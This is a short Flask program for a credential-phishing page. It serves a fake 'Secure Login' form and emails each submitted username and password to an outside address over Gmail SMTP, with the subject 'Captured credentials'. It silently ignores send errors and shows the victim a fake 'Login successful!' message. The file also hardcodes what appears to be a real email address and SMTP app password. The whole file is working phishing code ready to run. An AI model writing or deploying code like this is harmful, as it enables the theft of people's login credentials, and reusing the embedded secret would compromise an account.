from flask import Flask, request, render_template_string
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

login_form = """
<!doctype html>
<html lang="en">
  <head><title>Secure Login</title></head>
  <body>
    <h2>Login to Your Account</h2>
    <form method="POST" action="/login">
      <label>Username:</label><br>
      <input type="text" name="username" required><br><br>
      <label>Password:</label><br>
      <input type="password" name="password" required><br><br>
      <button type="submit">Log In</button>
    </form>
  </body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(login_form)

@app.route("/login", methods=["POST"])
def login():
    user = request.form.get("username")
    pwd = request.form.get("password")

    msg = EmailMessage()
    msg["Subject"] = "Captured credentials"
    msg["From"] = "yrivera@americana.edu.co"
    msg["To"] = "yrivera@americana.edu.co"
    msg.set_content(f"Username: {user}\\nPassword: {pwd}")

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login("yrivera@americana.edu.co", "gwmg andgpaaqgafjsr")
            server.send_message(msg)
    except Exception:
        pass

    return "<h3>Login successful! Redirecting...</h3>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
